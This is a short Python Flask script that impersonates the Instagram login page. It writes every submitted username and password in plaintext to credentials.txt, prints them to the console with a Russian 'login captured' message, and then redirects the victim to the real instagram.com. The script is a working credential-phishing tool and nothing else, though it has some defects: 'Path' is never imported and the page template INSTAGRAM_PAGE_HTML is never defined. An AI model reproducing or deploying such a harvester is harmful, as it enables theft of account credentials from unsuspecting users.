import os
from flask import Flask, request, redirect, render_template_string
import datetime

app = Flask(__name__)

BASE_DIR = Path(__file__).resolve().parent


def load_index_html() -> str:
    """Load static login page markup from index.html."""
    return (BASE_DIR / "index.html").read_text(encoding="utf-8")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username and password:
            log_entry = f"[{datetime.datetime.now()}] Username: {username}, Password: {password}\n"
            try:
                with open('credentials.txt', 'a', encoding='utf-8') as f:
                    f.write(log_entry)
                print(f"ЛОГИН ЗАХВАЧЕН: {username} / {password}")
            except Exception as e:
                print(f"ОШИБКА ЗАПИСИ: {e}")
       
        return redirect("https://www.instagram.com", code=302)
   
    return render_template_string(INSTAGRAM_PAGE_HTML)


if __name__ == '__main__':
    port = 80
    try:
        app.run(host='0.0.0.0', port=port)
    except Exception as e:
        print(f"Порт {port} занят. Запуск на 5000...")
        app.run(host='0.0.0.0', port=5000)
